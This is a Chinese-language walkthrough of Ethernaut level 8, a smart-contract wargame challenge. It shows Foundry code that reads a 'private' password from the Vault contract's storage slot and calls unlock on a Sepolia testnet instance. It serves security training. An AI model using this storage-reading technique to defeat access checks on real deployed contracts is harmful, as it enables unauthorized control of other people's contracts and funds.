# Level 8

[The Ethernaut level 8](https://ethernaut.openzeppelin.com/level/8)

这一关的要求是反转 `Vault` 的 `locked` 状态

`Vault` 合约提供了 `unlock` 函数，只需要提供对应的密码。虽然在合约中密码字段设置为 `private`，无法通过公开的方法访问。但是区块链上的状态变量是公开的，可以通过读取合约的存储插槽读区的值。  
`Vault` 合约中 `password` 状态变量占用插槽1，可以通过 foundry 读取该插槽的值。

示例代码：
```
Vault level = Vault(0x2a27021Aa2ccE6467cDc894E6394152fA8867fB4);

bytes32 password = vm.load(address(level), bytes32(uint256(1)));

level.unlock(password);
```
完整代码见：[这里](../../ethernaut/script/level08.s.sol)

Foundry 脚本：

调用脚本去读区对应插槽的值：
```
forge script script/level08.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

查询 locked 状态
```
cast call 0x2a27021Aa2ccE6467cDc894E6394152fA8867fB4 \
"locked()(bool)" \
--rpc-url sepolia
```

链上记录：
- [level(`Vault`) 实例](https://sepolia.etherscan.io/address/0x2a27021Aa2ccE6467cDc894E6394152fA8867fB4)
- [调用 `unlock` 函数](https://sepolia.etherscan.io/tx/0xf9600a8004358b0e446be4fb24152ecd4681b3a09ebb010136662ccd6a6185a1)

